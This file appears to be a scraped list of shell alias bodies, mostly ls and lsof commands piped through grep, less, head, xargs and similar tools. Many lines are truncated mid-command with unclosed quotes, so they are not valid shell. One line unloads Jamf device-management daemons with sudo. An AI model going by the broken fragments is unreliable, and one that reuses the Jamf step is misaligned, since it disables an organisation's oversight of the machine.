lsof | awk '{ print \$2 \
lsof | awk '{ print $2
lsof | awk
lsof / | awk '{ if($7 > 1048576) print $7/1048576
lsof / | awk '/ DEL /{proc[$1]=1;} END{for (name in proc){print name;}}'
lsof -wni tcp:3000 | ggrep -oP '(?<=ruby\s{5})[0-9]{5}'
lsof -ti:8080 | xargs kill
lsof -ti:5901 | xargs kill -9
lsof -ti:4200 | xargs kill
lsof -ti:4000 | xargs kill -9
lsof -ti:3000 | xargs kill
lsof -ti:${1:=8888} | xargs kill -9
lsof -ti tcp:$1 | xargs kill -9
lsof -t -i:8081 | xargs kill -9
lsof -t -i tcp:8000 | xargs kill -9
lsof -t -i tcp:$1 | xargs kill
lsof -sRPi | egrepi -E
lsof -nti:8080 | xargs kill -9
lsof -nti:4000 | xargs kill -9
lsof -nsRPi | egrepi -E
lsof -ni | grep LISTEN
lsof -ni TCP | grep java
lsof -ni -i4TCP:3000 | grep LISTEN
lsof -ni -P | grep LISTEN
lsof -nPiTCP | grep LISTEN
lsof -nPi | grep LISTEN
lsof -nPi | grep -i listen
lsof -nPi tcp | grep
lsof -nP | grep UDP
lsof -nP | grep TCP
lsof -nP | grep LISTEN
lsof -nP | grep -i listen
lsof -nP -itcp -sTCP:LISTEN | grep
lsof -nP -i4TCP:4200 | grep LISTEN
lsof -nP -i4TCP:${1:-9091} | grep LISTEN
lsof -nP -i4TCP | grep LISTEN
lsof -nP +c 15 | grep LISTEN
lsof -n |grep -i
lsof -n | grep LISTEN
lsof -n -iTCP:5432|grep -i listen
lsof -n -iTCP |grep LISTEN
lsof -n -iTCP | grep LISTEN
lsof -n -iTCP -P | grep LISTEN
lsof -n -i4TCP|grep LISTEN
lsof -n -i4TCP|awk /LISTEN/
lsof -n -i4TCP|awk /ESTABLISHED/
lsof -n -i4TCP:8080 | grep LISTEN
lsof -n -i4TCP:$PORT | grep LISTEN
lsof -n -i4TCP$PORT | grep LISTEN
lsof -n -i4TCP | grep LISTEN
lsof -n -i4TCP | grep -i 'listen'
lsof -n -i | grep LISTEN
lsof -n -i tcp | grep LISTEN
lsof -n -i -P | grep LISTEN
lsof -n -i -P | grep -v -e ^Microsoft -e ^Dropbox -e ^GitHub -e ^Google -e ^Finder -e ^Office365 -e ^firefox -e ^sharingd -e ^SystemUIS -e UserEvent -e ^ARDAgent -e ^Slack -e ^WiFi -e ^com\.apple
lsof -n -P -i4TCP|grep LISTEN
lsof -lP | grep LISTEN
lsof -l -i +L -R -V | grep ESTABLISHED
lsof -i| grep LISTEN
lsof -iTCP -sTCP:LISTEN -n -P | peco
lsof -i:${{{project_name_upper_underscored}}_LOCAL_PORT} | awk '{print $2}'
lsof -i:${EXAMPLE_LOCAL_PORT} | awk '{print $2}'
lsof -i:${DJAEIN_LOCAL_PORT} | awk '{print $2}'
lsof -i:${AL_LOCAL_PORT} | awk '{print $2}'
lsof -i4 -P | grep -i listen
lsof -i | grep zcashd && ~/zcash/./src/zcash-cli stop && sudo pkill -9 zcashd && sudo pkill -9 zcash-cli
lsof -i | grep node
lsof -i | grep LISTEN
lsof -i | grep ESTABLISHED
lsof -i | grep -i estab
lsof -i | grep $1
lsof -i | grep
lsof -i tcp:4567 -i tcp:1979 -i tcp:1234 -i tcp:4888 -i tcp:4200 -i tcp:4201 -i tcp:1080 -i tcp:1025 -i tcp:6379 -i tcp:5432 -i tcp:8085 -i tcp:27017 | tr -s
lsof -i tcp | grep ^ssh
lsof -i tcp -P | grep LISTEN
lsof -i TCP| fgrep LISTEN
lsof -i TCP | grep LISTEN
lsof -i TCP -n -P | grep LISTEN
lsof -i TCP -i UDP -n -P | grep LISTEN
lsof -i :8080 | grep LISTEN
lsof -i -p | grep -i 'listen'
lsof -i -n | grep ESTABLISHED
lsof -i -n | egrep '\<ssh\>'
lsof -i -n -P|grep LISTEN
lsof -i -n -P | grep privoxy
lsof -i -n -P | grep geth
lsof -i -n -P | grep UDP
lsof -i -n -P | grep TCP
lsof -i -n -P | grep LISTEN
lsof -i -n -P | grep -i listen
lsof -i -P|grep LISTEN
lsof -i -P| grep 'LISTEN'
lsof -i -Pn | grep LISTEN
lsof -i -P |grep LISTEN
lsof -i -P | grep LISTEN
lsof -i -P | grep -v -e ^Microsoft -e ^Dropbox -e ^BetterTou -e ^HipChat -e ^GitHub -e ^Google -e ^Finder -e ^Office365
lsof -i -P | grep -i listen
lsof -i -P | grep -i \
lsof -i -P | grep -i 'listen'
lsof -i -P | grep 'LISTEN'
lsof -i -P | grep $1
lsof -i -P | grep
lsof -i -P | ag listen
lsof -i -P | ag LISTEN
lsof -i -P -n | grep LISTEN
lsof -i -P -n | grep
lsof -U | grep
lsof -Pnl +M -i4 | grep LISTEN
lsof -Pnl +M -i4 | grep
lsof -Pni4 | grep php
lsof -Pni4 | grep nginx
lsof -Pni4 | grep httpd
lsof -Pni4 | grep LISTEN
lsof -Pn -i4 | grep LISTEN
lsof -Pn -i4 | grep ESTABLISHED
lsof -Pn -i4 | awk '{printf \
lsof -Pn -i4 -i6 | grep LISTEN
lsof -Pi | grep LISTEN
lsof -Pi | grep -i listen
lsof -Pi | grep -i estab
lsof -PRlni4TCP|awk /LISTEN/
lsof -PRlni4TCP|awk /ESTABLISHED/
lsof -PMni4 | grep LISTEN
lsof -P | grep LISTEN
lsof -P -i4 | grep LISTEN
lsof -P -i4 | grep ESTABLISHED
lsof -P -i | grep -i established
lsof -P -i TCP| fgrep LISTEN
lsof -P -i -n | grcat conf.nmap
lsof -P -i -n | cut -f 1 -d\
lsof -P -i -n | cut -f 1 -d \
lsof -P -i -n +c0 | awk '{printf \
lsof +fg +D /Volumes/$1 | grep -v EVO
lsof +c 0 | grep
lsof ${lsof_options} -nRPi | egrepi -E
lsof ${lsof_options} -RPi | egrepi -E
lsmod |grep openv
lsmod | sort
lsmod | less
lsmod | head
lsmod | grep sig_axiuart
lsmod | grep iwl
lsmod | grep -i
lsmod | grep
lsmod | egrep
lsmod | ag
lsmod | $PAGER
lsl | less -R
lsl -x | grep
lsl --color=always | less -R
lsic -al --color=auto | more
lsh | grep
lsf | grep -e '^\.'
lsd -lah | less
lsd -Al --color=always --group-dirs=first | less -r
lscpu | grep \
lscpu | grep MHz
lscpu | ccze -A
lscpu | awk
lscpu -p | awk 'BEGIN{FS=
lscpu && lscpu | grep bit && cat /proc/cpuinfo
lscpu && cpubugs && cputemp && cat /proc/cpuinfo | grep \
lsco -cview -avobs -s | xargs -i -n 15 -P 2 --no-run-if-empty cleartool ci -nc
lsco -cview -all -s | xargs -i -n 15 -P 2 --no-run-if-empty cleartool ci -nc
lsca | less -R
lsc -lAhF | less -R
lsblk | grep -v loop
lsblk | grep -v '/var/lib/snapd'
lsblk | awk
lsb_release -rs | cut -f1 -d.
lsb_release -c | sed \'s/\w*:\s*//g\\'
lsat | grep
lsas | grep
lsal | grep
lsa | less -R
lsa | grep -e ^d
lsa | grep
lsa | /usr/bin/grep --color=never '^d'
lsa node_modules | grep \\\\.\\\\./
lsa -x | grep
lsa -R | grep
lsa --color=always | less -R
ls_sort | lolcat-c
ls\ -al\ $LSPARAMS\ '| grep -i --color=always' # ls grep
ls\ -al\ $LSPARAMS\ '| grep -i '$GPARAM # ls grep
lsWithCommas -log --color=always | grep ^d
lsWithCommas -log --color=always | grep ^-
ls6 | grep -i
ls5 | grep -i
ls4 | grep -i
ls3 | grep -i
ls2 | grep -i
ls1 | grep -i
ls-by-added|tac
ls-by-added |head -n1
ls++ | more
ls++ | ls_color_internal
ls++ --potsf -a |more
ls –tlh | head
ls ~/ss/*.png | tail -n 1
ls ~/notes/;cat ~/notes/notes.txt | more
ls ~/dev/code/ ~/dev/nu/ | grep -v /
ls ~/Library/Developer/Xcode/DerivedData | wc -l
ls ~/Dropbox/Draft/**/*.rtf | xargs -I LINE textutil -convert txt LINE
ls ~/Downloads/$(ls -rt ~/Downloads/ |tail -1)
ls ~/.ssh/sockets/* 2>/dev/null | xargs -n1 -I{} ssh -S {} -O exit localhost
ls ~/.ssh/*.pub | xargs -L 1 ssh-keygen -l -f
ls ~/.cheat/ | sort
ls ~/.bash_aliases | xargs grep --color=auto
ls ~/.AnyBar/*.png | cut -d
ls |wc -l
ls |more
ls |lolcat
ls |less
ls |grep
ls |cat
ls | xargs say
ls | xargs du -hsc
ls | xargs du -h -s
ls | xargs -t -I{} git -C {} $@
ls | xargs -t -I{} git -C {}
ls | xargs -n1
ls | xargs -i{} convert '{}[600x>]' {}
ls | xargs -P10 -I{} git -C {} pull
ls | xargs -P10 -I{} git -C {} checkout master
ls | xargs -P10 -I{} git -C {} $@
ls | xargs -P1 -I@ zsh -c 'echo -e \
ls | xargs -I{} sh -c 'cd {} && echo {} && git checkout master && git fetch -p && git pull'
ls | xargs -I{} git -C {} pull
ls | xargs -I file du -sh file
ls | xargs -I '{}' ~/.shared_check '{}'
ls | xargs -I '{}' ~/.setdate '{}'
ls | xargs -I '{}' ~/.fixdir-silent '{}'
ls | xargs -I '{}' ~/.fixdate '{}'
ls | xargs -I '{}' ~/.catsfv '{}'
ls | xargs -I '{}' ~/.catnfo '{}'
ls | xargs -I '{}' ~/.catm3u '{}'
ls | xargs -I '{}' ~/.catcue '{}'
ls | xargs -I % sh -xc 'cd % && git diff-index --quiet HEAD -- && git pull --rebase'
ls | xargs
ls | wc -w
ls | wc -l && gls -p --color --group-directories-first
ls | wc -l
ls | wc
ls | tr ' ' '\n'
ls | toilet -f term -F gay
ls | tail -n1
ls | sort -r
ls | sort -nr
ls | sort -n
ls | sort -f
ls | sort -V
ls | sort --version-sort
ls | sort
ls | slmenu -p $PWD; [ $? -ne 0 ] && echo $PWD
ls | shuf -n 1
ls | sed s#^#$(pwd)/#
ls | sed -e 's/\.[a-zA-Z]*$//'
ls | sed
ls | say -vz
ls | say -va
ls | rg
ls | rev
ls | pyp \
ls | pr -T9 -W$COLUMNS
ls | perl -nE
ls | perl -e 'print sort { length(\$a) <=> length(\$b) } <>'
ls | peco --exec 'tmux set-buffer
ls | peco
ls | parallel git -C {} pull
ls | nms
ls | nless
ls | nl
ls | most
ls | more
ls | lolcat
ls | less -iXRS
ls | less -R
ls | less
ls | head -n1
ls | head -10
ls | head -1
ls | head
ls | grep'
ls | grep suc
ls | grep lock
ls | grep dif
ls | grep ^l
ls | grep ^d
ls | grep ^-
ls | grep \/$
ls | grep \/
ls | grep \
ls | grep /
ls | grep .txt
ls | grep .py
ls | grep -v ^d
ls | grep -v /$
ls | grep -v /
ls | grep -v '^d'
ls | grep -ie
ls | grep -i --color=auto
ls | grep -i $1
ls | grep -i
ls | grep -e dif -e suc
ls | grep -E
ls | grep --color=never '^d'
ls | grep --color=never '^-'
ls | grep --color=auto
ls | grep --color=always $1
ls | grep --color -i
ls | grep --color
ls | grep '^d'
ls | grep '^[dl]'
ls | grep $1
ls | grep
ls | fzf -m --preview='cat {}'
ls | fzf -0
ls | fzf
ls | fpp
ls | figlet -w0 -t
ls | egrep -v '^d'
ls | egrep -v
ls | egrep -i
ls | egrep '^d'
ls | egrep
ls | echo
ls | cowsay -f stegosaurus
ls | cowsay
ls | cols
ls | cat -n
ls | cat
ls | bidiv
ls | awk '/-shamsi/ {c=$0; gsub(\
ls | ag
ls | ack-grep -v '.part$'
ls | ack
ls | LC_ALL=C grep -i --color=auto
ls | LC_ALL=C grep --color=auto
ls | GREP_COLOR='1;34' grep --color '.*@'
ls |
ls tmp/capybara/screenshot_*.html | tail -n 1
ls src/**/*.js | entr -cdr flow && clear
ls out | xargs -P10 -I {} tools/ninja -C out/{} -j8 all
ls db/migrate/* | tail -n1
ls db/migrate | tail -n 5
ls bin/migration/ | awk
ls `find . -name bower_components | xargs`
ls \#* *~ .*~ | xargs rm ; \clear
ls 2009-* | tail -n1
ls /var/log/packages/ | grep -i
ls /var/log/packages/ | grep
ls /var/lib/initramfs-tools | sudo xargs -n1 /usr/lib/dkms/dkms_autoinstaller start
ls /usr/share/nmap/scripts/|grep
ls /usr/share/nmap/scripts/ | grep -i
ls /usr/share/nmap/scripts/ | grep
ls /usr/share/nmap/scripts | grep -i
ls /usr/share/nmap/scripts | grep
ls /usr/share/emacs/22.1/lisp/play/*.elc | column -t
ls /usr/local/bin | fzf --preview '{} --help'
ls /usr/bin | grep g++-
ls /usr/bin | grep
ls /sys/class/net/ | awk NF
ls /nix/store | grep $@
ls /home/loongxiaohan/Apps/Papers/已看 | grep
ls /etc/init.d | xargs -I{} service {} status
ls /dev/tty.* | grep usbmodem
ls /dev/ |grep -i 'tty\.u'
ls /dev/ | grep disk
ls /dev | grep usbcan
ls /dev | grep ttyUSB
ls /dev | grep ttyACM
ls /dev | grep sd; cd /dev
ls /dev | grep sd
ls /dev | grep USB
ls /dev | ag Sphero
ls /dev $LS_COLOR | grep sd.
ls /bin | grep
ls /Library/LaunchDaemons/com.jamfsoftware.* | xargs sudo launchctl unload
ls /Library/LaunchDaemons/com.jamfsoftware.* | xargs sudo launchctl load
ls /Library/Java/JavaVirtualMachines |ag jdk.*
ls .git/index | entr -c git l
ls ./misc/model/fields.xml | xargs egrep --color=auto
ls . | xargs -n 1 basename
ls . | wc -l
ls . | shuf -n 1
ls . | grep
ls . -a | grep
ls -x | grep
ls -x --color=always | less -R
ls -vA | grep --ignore-case --color=auto ^\\.
ls -v | sxiv -i -f -Z -p -t
ls -t|head
ls -trlh | tail -40
ls -trlh | tail -10
ls -trlh | less
ls -trl | tail
ls -tr | tail -n1
ls -tr | tail -n 1
ls -tr | tail -n
ls -tr | tail -1
ls -tr | grep
ls -tr /c/down | tail -n 10
ls -tr *(.) | sxiv -iao
ls -tr $(g st | cut -c4-)
ls -tp | grep -v /$
ls -tlrh --color=auto |tail -n 20
ls -tlh|head'
ls -tlh | tail
ls -tlh | head
ls -tlFhG |head
ls -tlFh | head
ls -tl | tail
ls -tl | more
ls -tl | less
ls -tl | head -n 20
ls -tl | head -20
ls -tl | ag --nocolor \
ls -tl /var/lib/dpkg/info/ | awk
ls -tl -- *(.) | tail
ls -tl *(.) | tail
ls -td -- */ | head -n 5
ls -talc | more
ls -tG|head
ls -t1 | head -n 1
ls -t ~/Downloads/**/* | head -n1
ls -t ~/Downloads/* | head -n 1
ls -t ~/Downloads/ | head
ls -t | tail -r
ls -t | tail -1
ls -t | head -n15
ls -t | head -n1
ls -t | head -n 5
ls -t | head -n 1
ls -t | head -l
ls -t | head -30
ls -t | head -3
ls -t | head -10
ls -t | head -1
ls -t | head
ls -t | ag
ls -t log_*.txt | head -1
ls -t /usr/bin | head -n 16
ls -t . | head -n 1
ls -t -n|sort -k 5 -n
ls -t -lah --color=always|head
ls -t -l | head
ls -t -1 $HOME/Code/dma/s3artifacts/*.* $HOME/Code/dma/s3artifacts | head -n3
ls -t --color=always | head
ls -t $* 2> /dev/null | head -n 1
ls -t $(g st | cut -c4-)
ls -sh --color | less -R
ls -s | sort -n
ls -s | more
ls -rtlh *(.) | tail
ls -rtlh *(.) | head
ls -rtl | tail
ls -rtl -- *(.) | tail
ls -rtl *(.) | tail
ls -rtl *(.) | head
ls -rtF | grep -v '.*/'
ls -rt |awk 'END {print $NF}'
ls -rt | tail -n1
ls -rt | tail -1
ls -rt | mpv --no-video -playlist -
ls -rlth | lolcat
ls -rlt | grep -P '^d'
ls -q | column -c 80
ls -ptw 1 | grep -v /
ls -po --color=always | grep /$
ls -pal | grep -v /
ls -pa | grep -v /
ls -pa --color=tty | grep /
ls -pa --color=tty | grep -v /
ls -pC ${short_list_options} | less -iFQRX
ls -p | grep \/
ls -p | grep \
ls -p | grep /$
ls -p | grep /
ls -p | grep -v /
ls -p | grep -v
ls -p --color=tty | grep /
ls -p ${long_list_options} | less -iFNQRX
ls -olhA | less
ls -oFal | grep
ls -oAhF --group-directories-first | grep -i
ls -oAFh | less
ls -o | grep ^d
ls -o -g -h --color=always | sed -re 's/^[^ ][^ ]* //'
ls -mA -t --group-directories-first | grep
ls -mA -S --group-directories-first | grep
ls -mA --group-directories-first | grep
ls -m1 | pbcopy
ls -l|wc -l
ls -l|more
ls -l|less
ls -l|grep drwx
ls -l|grep ^d
ls -l|grep ^-
ls -l|grep '^[dl]'
ls -l|grep
ls -l|awk '{if(NR>1) printf(\
ls -l|$PAGER
ls -l| wc -l;ls -halt
ls -l| egrep --color=never
ls -lv |less
ls -lt|more
ls -lt|head -n 20
ls -lt|head -n
ls -lt|head -12
ls -lt|head
ls -lt| head
ls -ltur | tail -10
ls -ltur | reverseorder
ls -ltr|tail -10
ls -ltr|tail
ls -ltr|grep
ls -ltr| tail -n
ls -ltru|tail
ls -ltrhL | grep ^d
ls -ltrhL --color=tty | grep ^d
ls -ltrh | tail -n 15
ls -ltrh | tail
ls -ltrh | head
ls -ltrh | grep ^d
ls -ltrh | grep -v ^d
ls -ltra|tail
ls -ltrahL | grep ^d
ls -ltrahL --color=tty | grep ^d
ls -ltra | lolcat
ls -ltra | grep -i
ls -ltra | grep '\->'
ls -ltrG | grep '^d'
ls -ltrF | grep ^d
ls -ltrF | grep .py
ls -ltrF | grep
ls -ltrF --color=auto | grep --color=never ^d
ls -ltrF --color | grep ^d
ls -ltrAh | tail
ls -ltrAh | head
ls -ltr |tail -15
ls -ltr |tail
ls -ltr | tail -n $LINES
ls -ltr | tail -n
ls -ltr | tail -5
ls -ltr | tail -40
ls -ltr | tail -30
ls -ltr | tail -3
ls -ltr | tail -10
ls -ltr | tail -1
ls -ltr | tail
ls -ltr | reverseorder
ls -ltr | less
ls -ltr | grep dr
ls -ltr | grep ^d
ls -ltr | grep -v dr
ls -ltr | grep -v '^d.*'
ls -ltr | grep -i
ls -ltr | grep '^d.*'
ls -ltr | grep
ls -ltr | ccze -A
ls -ltr /opt/ptc/windchill/extract/archive/* | grep
ls -ltr /jyates/.sbsyncmaster/Bcgir_thin.logs | tail
ls -ltr /jyates/.sbsyncmaster/Bcgir_task.logs | tail
ls -ltr --color=always|head -n24
ls -ltr *.h* *H* | grep -v dr
ls -ltr *.C* *.c* | grep -v dr
ls -lth|head -20
ls -lth|/usr/bin/head -20
ls -lthr | tail
ls -lthNacF --group-directories-first --color=auto | more
ls -lthA | head -n 20
ls -lth | pg
ls -lth | less
ls -lth | head -n 20
ls -lth | head -n 10
ls -lth | head -15
ls -lth | head
ls -lth --color=auto | grep --color=auto
ls -lth --color | head
ls -ltc|head
ls -ltcr | reverseorder
ls -lta | less
ls -ltU | head
ls -ltAh | tail
ls -lt ~/Downloads | head -n 10
ls -lt |more
ls -lt |head
ls -lt | more
ls -lt | less
ls -lt | head -n25
ls -lt | head -n 30
ls -lt | head -n 20
ls -lt | head -n 10
ls -lt | head -6
ls -lt | head -5
ls -lt | head -30
ls -lt | head -25
ls -lt | head -20
ls -lt | head -16
ls -lt | head -12
ls -lt | head -10
ls -lt | head
ls -lt | grep drw
ls -lt | grep ^l
ls -lt | grep ^d
ls -lt \!*| more
ls -lt \!* | more
ls -lt --color=always |less --RAW-CONTROL-CHARS
ls -lt $@ | head -10
ls -lsa|grep
ls -lsah | lolcat
ls -lsFA | less
ls -lrt|grep $1
ls -lrt| more
ls -lrthiG|tail -n 15
ls -lrtha | grep -ri
ls -lrthF | tail
ls -lrthF | head
ls -lrth ~/Downloads | tail -n
ls -lrth | tail -n 10
ls -lrth | tail
ls -lrth | less
ls -lrth | grep ^d
ls -lrth --color | head
ls -lrtah | tail
ls -lrta | tail
ls -lrta | more
ls -lrta | grep $1
ls -lrtFho | tail -10
ls -lrtFh | grep '/$'
ls -lrt ~/Downloads | tail -n10
ls -lrt | tail -6
ls -lrt | tail -10
ls -lrt | tail
ls -lrt | more
ls -lrt | igrep
ls -lrt | grep drw
ls -lrt | grep -e '^d'
ls -lrt | grep $1
ls -lrt --color| grep -i
ls -lrt --color=always | tail
ls -lrt --color | tail
ls -lrt *(.) | tail
ls -lrt *(.) | head
ls -lrat | grep drw
ls -lphG | grep '^d'
ls -lpaFh | most
ls -lp | more
ls -lp | grep ^d
ls -lp | grep -v /
ls -lp | grep '/'
ls -lp | ag -v /
ls -lp --color=auto | more
ls -lp --color=auto | grep ^d
ls -lotrG|tail -n 20
ls -loF --color=always |less -r
ls -loAGF --color | less -R
ls -lh|less
ls -lht|head
ls -lhtr --time-style='+%Y-%m-%d %H:%M:%S' | grep -v '^d'
ls -lhtA | head -n 20
ls -lht ~/Baixades/ | head
ls -lht | less
ls -lht | head -n 10
ls -lht | head -20
ls -lht | head
ls -lht | grep --color=never '^d'
ls -lht | grep '^d'
ls -lht 2>/dev/null | head -n 7
ls -lht . | sed -n 2p
ls -lht --color=tty| head -n 20
ls -lht --color=always | head
ls -lht --color | head -5
ls -lht --color | head -10
ls -lhrt | tail
ls -lhp | grep '^d'
ls -lhp --group-directories-first | grep
ls -lhoAFG | grep -i
ls -lhoAF --color=auto | grep -i
ls -lhap --color | more
ls -lhaFG | less -R
ls -lhaF | grep --color=never '^d'
ls -lhaF --color | grep -v /
ls -lha | sed -re 's/^[^ ]* //'
ls -lha | more
ls -lha | less
ls -lha | grep '^d'
ls -lha | grep
ls -lha | fgrep -i --color
ls -lha | egrep -v '^d'
ls -lha --color | less -R
ls -lhSp | awk '{print \$5\
ls -lhS | grep -v '^d'
ls -lhS | grep '^-'
ls -lhS **/** | head
ls -lhR | $PAGER
ls -lhR --color=always | $PAGER
ls -lhGtr ; ls -lhGtr | wc; echo 'ls -lhGtr'
ls -lhGgo | tail
ls -lhGgo | more
ls -lhGgo | less
ls -lhGgo | head
ls -lhGd */ && ls -lhGd */ | grep
ls -lhG | grep
ls -lhG ; ls -lhG | wc; echo 'ls -lhG'
ls -lhF|grep -v /
ls -lhFG | grep ^d
ls -lhFAG | less
ls -lhFA | less --color=tty
ls -lhFA | less
ls -lhFA | fx
ls -lhFA | /c/Program\ Files/Git/usr/bin/less -IRFX
ls -lhFA --color=never| less -r
ls -lhFA --color=auto | less
ls -lhFA --color=always | less -r
ls -lhFA --color | less -R
ls -lhFA ${colorflag} | less
ls -lhF | less
ls -lhF | grep --color=never '^d'
ls -lhF | grep '^d'
ls -lhF | grep
ls -lhF -GFh | grep '^d'
ls -lhF -G | grep --color=never '^d'
ls -lhF --color=yes | less -R
ls -lhF --color | grep --color=never '^d'
ls -lhF --color | grep --color=never
ls -lhF ${colorflag} | grep \
ls -lhF ${colorflag} | grep --color=never '^l'
ls -lhF ${colorflag} | grep --color=never '^d'
ls -lhF ${colorflag} | grep --color=never
ls -lhF $colorflag | grep --color=never '^d'
ls -lhAR --color=auto | more
ls -lhAGFTv | less
ls -lhAG | more
ls -lhAG --color=always | sed -re 's/^[^ ]* //'
ls -lhAF | less
ls -lhAF | grep -i
ls -lhAF | grep '^d'
ls -lhAF --show-control-chars --color=auto | less
ls -lhAF --color=auto | more
ls -lhAF --color=always | less -RF
ls -lhA |grep ^d
ls -lhA |grep ^-
ls -lhA | less
ls -lhA | grep
ls -lhA | $PAGER
ls -lhA --color=auto | grep -v ^d
ls -lhA --color=always | $PAGER
ls -lhA --color | less -R
ls -lh | sort -k5 -h
ls -lh | sed -e
ls -lh | more
ls -lh | less -r
ls -lh | less -R
ls -lh | less
ls -lh | grep ^d
ls -lh | grep -v ^d
ls -lh | grep -i --color=auto
ls -lh | grep -i
ls -lh | grep --color=never '^d'
ls -lh | grep '^d'
ls -lh | grep
ls -lh | egrep -v '^d'
ls -lh | egrep '^d'
ls -lh | ccze -A
ls -lh | awk '\$5 == 0'
ls -lh | ag
ls -lh | LC_ALL=C grep -i --color=auto
ls -lh --sort date -r --color=always | head -25
ls -lh --group-directories-first | h -i $LS_ALL
ls -lh --group-directories-first | awk
ls -lh --color|more
ls -lh --color=auto|less
ls -lh --color=auto | less
ls -lh --color=always | less
ls -lh --color=always --group-directories-first --sort=size | coloredls
ls -lh --color | less -r
ls -lh --color | less -R
ls -lh --color | less
ls -lh --color | grep -e \
ls -lh --classify --sort=time | head
ls -lh *(*) | head
ls -lh err.txt generated.file succ.txt | less -R
ls -lh ${colorflag} | grep --color=never '^d'
ls -lh $@; ls -l $@ | awk '{ SUM += \$5} END { print SUM/1024/1024/1024 }'
ls -lg|more
ls -ldF err.txt generated.file succ.txt | less
ls -ldAFrt .??* | grep -v ^d
ls -ldAF .??* | grep ^d
ls -ldAF .??* | grep -v ^d
ls -ld | grep '^[.]*'
ls -ld `ll | grep -e
ls -ld . .. | grep -v ^d
ls -ld .!(|.)
ls -ld */ | cut -f1 -d'/'
ls -ld ${colorflag} | grep --color=never '^d'
ls -lcth | head -n20
ls -lcth | head -25
ls -la|more
ls -la|lolcat
ls -la|less
ls -la|grep ^d
ls -laxo | more
ls -lautF | less -E
ls -laut |less
ls -lat|sort
ls -lat|head -n 20
ls -latrd err.txt generated.file succ.txt | grep '^d'
ls -latr | tail -10
ls -latr | tail
ls -latr | less
ls -latr | grep ^d
ls -lath | less
ls -lath | head
ls -lath | grep
ls -lath | ack -i
ls -lath --color=always | less -R
ls -lath $HOME/Downloads/ | head
ls -latF | less -E
ls -lat |less
ls -lat | more
ls -lat | head
ls -lat | grep drw
ls -last | more
ls -las | awk '
ls -lart|tail
ls -lart|grep ^d
ls -lart| tail
ls -larthf -G | grep --color=never '^d'
ls -larth | less
ls -larth --color | more
ls -lart | tail -20
ls -lart | ccze -A
ls -laph | grep -v /
ls -lap | more
ls -laht | head -20
ls -laht /tmp | tac
ls -laht $1/* | more
ls -lahrt | grep $1
ls -lahrt --color|more
ls -lahrt --color=always | awk
ls -lahp | grep -v /
ls -lahp --color|grep -v /
ls -lahR | sed -e '/^total.*$/d' -e '/.*\\.$/d'
ls -lahR | less
ls -lahGp | grep -v /
ls -lahGF | $PAGER
ls -lahG | grep --color=always
ls -lahG | cut -f 6- -d ' '
ls -lahG | ag
ls -lahG ; ls -lahG | wc; echo 'ls -lahG'
ls -lahG --color | sort
ls -lahFG | grep ^d
ls -lahF --color=no |__filtor
ls -lahF ${ls_colorflag} | less -R
ls -lah | sort -k5 -h
ls -lah | sort -h -k5
ls -lah | peco
ls -lah | more
ls -lah | lolcat
ls -lah | less -R
ls -lah | less
ls -lah | grep ^l
ls -lah | grep ^d
ls -lah | grep \
ls -lah | grep -i $1
ls -lah | grep -i
ls -lah | grep --color=never '^l'
ls -lah | grep --color=never '^d'
ls -lah | grep '^total'
ls -lah | grep '^d'
ls -lah | grep
ls -lah | fzf
ls -lah | cut -c 25-
ls -lah --color|more
ls -lah --color=y -F | table
ls -lah --color=auto | more
ls -lah --color=auto | g
ls -lah --color=always | more
ls -lah --color=always | less -r
ls -lah --color=always | less -R
ls -lah --color=always | less
ls -lah --color=always | ag --nocolor
ls -lah --color | grep
ls -lah ${colcorflag} | grep ^d
ls -lagGFqt \!* | head
ls -lagG \!* | more
ls -lagF \!* | less
ls -lagF --full-time --color=auto | less
ls -lag --color | more
ls -lag $* | more
ls -lact --time-style=long-iso | less
ls -laSh --color=auto |l
ls -laR| grep -ni
ls -laR | less
ls -laR $1 | more
ls -laH | grep
ls -laGt | less
ls -laG | more
ls -laG | lolcat
ls -laFt | head
ls -laFh --color | less -R
ls -laFh ${colorflag} | less -R
ls -laFG | less -R
ls -laFG | less
ls -laF | more
ls -laF | less
ls -laF | grep /
ls -laF | grep -i
ls -laF | fgrep '*'
ls -laF --color=always | less -R
ls -laF --color=always --group-directories-first | /home/danny/.local/bin/coloredls
ls -laF --color | more
ls -laF --color | lv
ls -laF ${colorflag} | grep --color=never '^d'
ls -la; hostname -I | cut -f 1 -d ' '; python2 -m SimpleHTTPServer
ls -la; echo -n 'total files'; ls -la | wc - l
ls -la ~/.scripts/ | cat
ls -la ~/.gitconfig | awk -F\ '{print \$11 \
ls -la |pg
ls -la |more
ls -la |less
ls -la |grep ^d
ls -la |grep
ls -la | sort -k5hr
ls -la | sort -k 1
ls -la | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
ls -la | peco
ls -la | more -d
ls -la | more
ls -la | lolcat -t
ls -la | lolcat
ls -la | less -XF
ls -la | less
ls -la | grepi
ls -la | grep dr
ls -la | grep ^l
ls -la | grep ^d
ls -la | grep ^-
ls -la | grep \
ls -la | grep -v ^d
ls -la | grep -i
ls -la | grep -Ee $1
ls -la | grep --color=never ^d
ls -la | grep --color=never '^d'
ls -la | grep '^d'
ls -la | grep '\-\>'
ls -la | grep '\->'
ls -la | grep $@
ls -la | grep $1
ls -la | grep
ls -la | filterUnwantedLight
ls -la | egrep '^d'
ls -la | egrep
ls -la | awk 'NR > 1 { print
ls -la | awk
ls -la | ag
ls -la node_modules/ | grep bunsen
ls -la \!*| more
ls -la /usr/lib32 | grep freetype
ls -la /dev/shm/ | grep burgebra
ls -la /Users/brochester/Development/VO/webclient/node_modules/@victorops | grep '\->'
ls -la . | less
ls -la -G | peco
ls -la -F | less -R
ls -la --group-directories-first | more
ls -la --group-directories-first | awk
ls -la --color=never | more
ls -la --color=auto | less
ls -la --color=auto --human-readable --classify | grep
ls -la --color=always | sort -f
ls -la --color=always | more
ls -la --color=always | less -r
ls -la --color=always | less -RNSJFX
ls -la --color=always | less -R
ls -la --color | sort
ls -la --color | grep '^d'
ls -la --color --group-directories-first | more
ls -la --classify --color=always -l --human-readable |less -R
ls -la ${pwd} | grep
ls -la ${colorflag} | less
ls -la ${colorflag} | grep '^d'
ls -la $1 | more
ls -la $1 | less
ls -lTthp | grep '^d'
ls -lSr | reverseorder
ls -lSh *(.) | tail
ls -lSh *(.) | head
ls -lS | more
ls -lR|grep '^[dl]'
ls -lRhG | less -FX
ls -lRh |more
ls -lRh --color | less -r
ls -lR |more
ls -lR | grep
ls -lR | awk '{s+=$5} END {print s}'
